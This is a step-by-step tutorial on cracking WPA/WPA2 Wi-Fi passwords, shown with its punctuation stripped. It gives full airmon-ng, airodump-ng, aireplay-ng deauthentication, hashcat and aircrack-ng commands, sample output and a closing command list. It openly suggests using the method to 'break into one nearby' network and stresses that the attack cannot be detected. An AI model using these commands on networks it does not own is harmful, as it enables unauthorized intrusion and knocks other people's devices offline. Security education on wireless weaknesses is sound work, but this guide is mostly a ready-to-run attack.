wi fi cracking crack wpa wpa2 wi fi routers with airodump ng and aircrack ng hashcat this is a brief walk through tutorial that illustrates how to crack wi fi networks that are secured using weak passwords it is not exhaustive but it should be enough information for you to test your own networks security or break into one nearby the attack outlined below is entirely passive listening only nothing is broadcast from your computer and it is impossible to detect provided that you dont actually use the password that you crack an optional active deauthentication attack can be used to speed up the reconnaissance process and is described at the end of this document if you are familiar with this process you can skip the descriptions and jump to a list of the commands used at the bottom for a variety of suggestions and alternative methods see the appendix neal1991 and tiiime have also graciously provided translations to this document and the appendix in chinese if you prefer those versions disclaimer this software tutorial is for educational purposes only it should not be used for illegal activity the author is not responsible for its use dont be a dick getting started this tutorial assumes that you have a general comfortability using the command line are running a debian based linux distro preferably kali linux osx users see the appendix have aircrack ng installed sudo apt get install aircrack ng have a wireless card that supports monitor mode see here for a list of supported devices cracking a wi fi network monitor mode begin by listing wireless interfaces that support monitor mode with bash airmon ng if you do not see an interface listed then your wireless card does not support monitor mode ðŸ˜ž we will assume your wireless interface name is wlan0 but be sure to use the correct name if it differs from this next we will place the interface into monitor mode bash airmon ng start wlan0 run iwconfig you should now see a new monitor mode interface listed likely mon0 or wlan0mon find your target start listening to 802 11 beacon frames broadcast by nearby wireless routers using your monitor interface bash airodump ng mon0 you should see output similar to what is below ch 13 elapsed 52 s 2017 07 23 15 49 bssid pwr beacons data s ch mb enc cipher auth essid 14 91 82 f7 52 eb 66 205 26 0 1 54e opn belkin 2e8 guests 14 91 82 f7 52 e8 64 212 56 0 1 54e wpa2 ccmp psk belkin 2e8 14 22 db 1a db 64 81 44 7 0 1 54 wpa2 ccmp 14 22 db 1a db 66 83 48 0 0 1 54e wpa2 ccmp psk steveserro 9c 5c 8e c9 ab c0 81 19 0 0 3 54e wpa2 ccmp psk hackme 00 23 69 ad af 94 82 350 4 0 1 54e wpa2 ccmp psk kaitlins awesome 06 26 bb 75 ed 69 84 232 0 0 1 54e wpa2 ccmp psk hh2 78 71 9c 99 67 d0 82 339 0 0 1 54e wpa2 ccmp psk arris 67d2 9c 34 26 9f 2e e8 85 40 0 0 1 54e wpa2 ccmp psk comcast 2eea ext bc ee 7b 8f 48 28 85 119 10 0 1 54e wpa2 ccmp psk root ec 1a 59 36 ad ca 86 210 28 0 1 54e wpa2 ccmp psk belkin dca for the purposes of this demo we will choose to crack the password of my network hackme remember the bssid mac address and channel ch number as displayed by airodump ng as we will need them both for the next step capture a 4 way handshake wpa wpa2 uses a 4 way handshake to authenticate devices to the network you dont have to know anything about what that means but you do have to capture one of these handshakes in order to crack the network password these handshakes occur whenever a device connects to the network for instance when your neighbor returns home from work we capture this handshake by directing airmon ng to monitor traffic on the target network using the channel and bssid values discovered from the previous command bash replace c and bssid values with the values of your target network w specifies the directory where we will save the packet capture airodump ng c 3 bssid 9c 5c 8e c9 ab c0 w mon0 ch 6 elapsed 1 min 2017 07 23 16 09 bssid pwr rxq beacons data s ch mb enc cipher auth essid 9c 5c 8e c9 ab c0 47 0 140 0 0 6 54e wpa2 ccmp psk asus now we wait once youve captured a handshake you should see something like wpa handshake bc d3 c9 ef d2 67 at the top right of the screen just right of the current time if you are feeling impatient and are comfortable using an active attack you can force devices connected to the target network to reconnect be sending malicious deauthentication packets at them this often results in the capture of a 4 way handshake see the deauth attack section below for info on this once youve captured a handshake press ctrl c to quit airodump ng you should see a cap file wherever you told airodump ng to save the capture likely called 01 cap we will use this capture file to crack the network password i like to rename this file to reflect the network name we are trying to crack bash mv 01 cap hackme cap crack the network password the final step is to crack the password using the captured handshake if you have access to a gpu i highly recommend using hashcat for password cracking ive created a simple tool that makes hashcat super easy to use called naive hashcat if you dont have access to a gpu there are various online gpu cracking services that you can use like gpuhash me or onlinehashcrack you can also try your hand at cpu cracking with aircrack ng note that both attack methods below assume a relatively weak user generated password most wpa wpa2 routers come with strong 12 character random passwords that many users rightly leave unchanged if you are attempting to crack one of these passwords i recommend using the probable wordlists wpa length dictionary files cracking with naive hashcat recommended before we can crack the password using naive hashcat we need to convert our cap file to the equivalent hashcat file format hccapx you can do this easily by either uploading the cap file to https hashcat net cap2hccapx or using the cap2hccapx tool directly bash cap2hccapx bin hackme cap hackme hccapx next download and run naive hashcat bash download git clone https github com brannondorsey naive hashcat cd naive hashcat download the 134mb rockyou dictionary file curl l o dicts rockyou txt https github com brannondorsey naive hashcat releases download data rockyou txt crack baby crack 2500 is the hashcat hash mode for wpa wpa2 hash file hackme hccapx pot file hackme pot hash type 2500 naive hashcat sh naive hashcat uses various dictionary rule combination and mask smart brute force attacks and it can take days or even months to run against mid strength passwords the cracked password will be saved to hackme pot so check this file periodically once youve cracked the password you should see something like this as the contents of your pot file e30a5a57fc00211fc9f57a4491508cc3 9c5c8ec9abc0 acd1b8dfd971 asus hacktheplanet where the last two fields separated by are the network name and password respectively if you would like to use hashcat without naive hashcat see this page for info cracking with aircrack ng aircrack ng can be used for very basic dictionary attacks running on your cpu before you run the attack you need a wordlist i recommend using the infamous rockyou dictionary file bash download the 134mb rockyou dictionary file curl l o rockyou txt https github com brannondorsey naive hashcat releases download data rockyou txt note that if the network password is not in the wordfile you will not crack the password bash a2 specifies wpa2 b is the bssid w is the wordfile aircrack ng a2 b 9c 5c 8e c9 ab c0 w rockyou txt hackme cap if the password is cracked you will see a key found message in the terminal followed by the plain text version of the network password aircrack ng 1 2 beta3 00 01 49 111040 keys tested 1017 96 k s key found hacktheplanet master key a1 90 16 62 6c b3 e2 db bb d1 79 cb 75 d2 c7 89 59 4a c9 04 67 10 66 c5 97 83 7b c3 da 6c 29 2e transient key cb 5a f8 ce 62 b2 1b f7 6f 50 c0 25 62 e9 5d 71 2f 1a 26 34 dd 9f 61 f7 68 85 cc bc 0f 88 88 73 6f cb 3f cc 06 0c 06 08 ed df ec 3c d3 42 5d 78 8d ec 0c ea d2 bc 8a e2 d7 d3 a2 7f 9f 1a d3 21 eapol hmac 9f c6 51 57 d3 fa 99 11 9d 17 12 ba b6 db 06 b4 deauth attack a deauth attack sends forged deauthentication packets from your machine to a client connected to the network you are trying to crack these packets include fake sender addresses that make them appear to the client as if they were sent from the access point themselves upon receipt of such packets most clients disconnect from the network and immediately reconnect providing you with a 4 way handshake if you are listening with airodump ng use airodump ng to monitor a specific access point using c channel bssid mac until you see a client station connected a connected client look something like this where is 64 bc 0c 48 97 f7 the client mac ch 6 elapsed 2 mins 2017 07 23 19 15 bssid pwr rxq beacons data s ch mb enc cipher auth essid 9c 5c 8e c9 ab c0 19 75 1043 144 10 6 54e wpa2 ccmp psk asus bssid station pwr rate lost frames probe 9c 5c 8e c9 ab c0 64 bc 0c 48 97 f7 37 1e 1e 4 6479 asus now leave airodump ng running and open a new terminal we will use the aireplay ng command to send fake deauth packets to our victim client forcing it to reconnect to the network and hopefully grabbing a handshake in the process bash 0 2 specifies we would like to send 2 deauth packets increase this number if need be with the risk of noticeably interrupting client network activity a is the mac of the access point c is the mac of the client aireplay ng 0 2 a 9c 5c 8e c9 ab c0 c 64 bc 0c 48 97 f7 mon0 you can optionally broadcast deauth packets to all connected clients with bash not all clients respect broadcast deauths though aireplay ng 0 2 a 9c 5c 8e c9 ab c0 mon0 once youve sent the deauth packets head back over to your airodump ng process and with any luck you should now see something like this at the top right wpa handshake 9c 5c 8e c9 ab c0 now that youve captured a handshake you should be ready to crack the network password list of commands below is a list of all of the commands needed to crack a wpa wpa2 network in order with minimal explanation bash put your network device into monitor mode airmon ng start wlan0 listen for all nearby beacon frames to get target bssid and channel airodump ng mon0 start listening for the handshake airodump ng c 6 bssid 9c 5c 8e c9 ab c0 w capture mon0 optionally deauth a connected client to force a handshake aireplay ng 0 2 a 9c 5c 8e c9 ab c0 c 64 bc 0c 48 97 f7 mon0 crack password with aircrack ng download 134mb rockyou txt dictionary file if needed curl l o rockyou txt https github com brannondorsey naive hashcat releases download data rockyou txt crack w aircrack ng aircrack ng a2 b 9c 5c 8e c9 ab c0 w rockyou txt capture 01 cap or crack password with naive hashcat convert cap to hccapx cap2hccapx bin capture 01 cap capture 01 hccapx crack with naive hashcat hash file hackme hccapx pot file hackme pot hash type 2500 naive hashcat sh appendix the response to this tutorial was so great that ive added suggestions and additional material from community members as an appendix check it out to learn how to capture handshakes and crack wpa passwords on macos osx capture handshakes from every network around you with wlandump ng use crunch to generate 100 gb wordlists on the fly spoof your mac address with macchanger a chinese version of the appendix is also available attribution much of the information presented here was gleaned from lewis encarnacions awesome tutorial thanks also to the awesome authors and maintainers who work on aircrack ng and hashcat overwhelming thanks to neal1991 and tiiime for translating this tutorial into chinese further shout outs to yizhiheng hiteshnayak305 enilfodne drinkmorecodemore hivie7510 cprogrammer1994 0xe4 hartzell zeeshanu flennic bhusang tversteeg gpetrousov crowchirp and shark0der who also provided suggestions and typo fixes on reddit and github if you are interested in hearing some proposed alternatives to wpa2 check out some of the great discussion on this hacker news post